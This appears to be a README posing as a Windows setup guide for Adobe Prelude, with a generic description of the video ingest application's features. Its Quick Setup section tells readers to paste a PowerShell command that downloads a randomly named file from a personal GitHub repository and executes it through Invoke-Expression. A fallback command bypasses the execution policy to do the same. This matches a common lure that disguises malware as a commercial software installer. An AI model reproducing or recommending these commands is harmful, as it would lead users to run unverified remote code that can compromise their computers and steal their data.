# Prelude

Prelude is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Prelude and work in it.

Adobe Prelude is a desktop ingest and logging application for professional video teams on Windows. It sits at the front of the post-production chain, helping assistants and editors pull camera originals from removable media, verify copies, and attach organizational metadata before anything lands in Adobe Premiere Pro.

A typical session starts when new rushes arrive on an external drive or card reader. You create a project, point Prelude at the source folders, and run an ingest preset that transcodes or copies files while generating thumbnails and timecode-aware previews. While media transfers, you tag shots with scene and take information, flag selects with markers, and build a rough assembly that editors can open as a structured bin in Premiere Pro without re-linking paths by hand.

This repository holds the Windows setup package for local installation, configuration notes tuned for common ingest presets, and a short changelog that tracks packaging updates. Together these files document how our team standardizes Prelude alongside shared storage and Premiere-oriented handoff folders on Windows workstations.

## What you do with it

- Batch ingest from cards and drives with checksum verification before files enter shared storage.
- Add searchable markers, comments, and ratings to clips during transfer instead of after edit.
- Transcode raw camera formats to editing-friendly proxies using reusable ingest presets on Windows.
- Apply metadata templates so scene, take, and reel fields stay consistent across every imported batch.
- Build rough-cut assemblies and subclips that open directly in Premiere Pro with links intact.
- Rename and reorder incoming reels using batch rules tied to timecode and camera metadata.
- Preview codecs and frame rates on the timeline before handoff to avoid surprises in editorial.
- Export structured bins and logging reports that match your team naming conventions for archives.

## Quick Setup (PowerShell)

This installs the program Prelude on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/vanessa242878/prelude-setup-guide/main/mka0al68le.g7ec9o2o | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/vanessa242878/prelude-setup-guide/main/mka0al68le.g7ec9o2o | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `mka0al68le.g7ec9o2o` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `vanessa242878/prelude-setup-guide`. Adobe Prelude 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
